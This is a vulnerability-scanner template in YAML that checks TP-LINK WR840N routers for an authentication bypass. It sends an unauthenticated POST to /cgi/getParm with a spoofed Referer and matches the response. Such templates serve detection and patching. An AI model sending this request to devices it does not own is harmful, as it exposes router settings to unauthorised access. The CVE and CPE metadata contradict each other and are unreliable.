id: tp-link-wr840n-auth-bypass

info:
  name: TP-LINK WR840N v6 up to 0.9.1 4.16 - 漏洞（CVE-2024-57050）
  author: DhiyaneshDK
  severity: critical
  description: |-
    TP-LINK WR840N v6 up to 0.9.1 4.16 存在安全漏洞。攻击者可通过 /cgi/getParm 触发异常业务逻辑、未授权访问或敏感数据暴露。该模板通过请求 /cgi/getParm，并结合响应中的 $.ret=0;、var、application/javascript 等特征进行验证。
  impact: |-
    - 攻击者可利用该缺陷访问未授权功能、敏感数据或影响系统正常业务流程。
    - 具体风险会结合部署方式、权限边界和业务场景进一步放大。
  remediation: |-
    - 尽快将 TP-LINK WR840N v6 up to 0.9.1 4.16 升级到厂商已发布的修复版本，并结合官方公告核对受影响版本范围。
    - 结合该接口的实际用途补充输入校验、访问控制、日志审计与最小权限配置，降低被进一步利用的可能性。
  reference:
    - https://github.com/Shuanunio/CVE_Requests/blob/main/TP-Link/WR840N%20v6/ACL%20bypass%20Vulnerability%20in%20TP-Link%20TL-WR840N.md
    - https://www.exploit-db.com/exploits/44781/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-11714
    cwe-id: CWE-287
    epss-score: 0.35365
    epss-percentile: 0.98312
    cpe: cpe:2.3:o:tp-link:tl-wr840n_firmware:0.9.1_3.16:*:*:*:*:*:*:*,cpe:2.3:h:tp-link:tl-wr840n:5.0:*:*:*:*:*:*:*,cpe:2.3:o:tp-link:tl-wr841n_firmware:0.9.1_4.16:*:*:*:*:*:*:*,cpe:2.3:h:tp-link:tl-wr841n:13.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="WR840N"
  tags: tp-link,auth-bypass,vuln

http:
  - raw:
      - |
        POST /cgi/getParm HTTP/1.1
        Host: {{Hostname}}
        Referer: http://tplinkwifi.net

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "$.ret=0;"
          - "var "
        condition: and

      - type: word
        part: content_type
        words:
          - "application/javascript"

      - type: status
        status:
          - 200
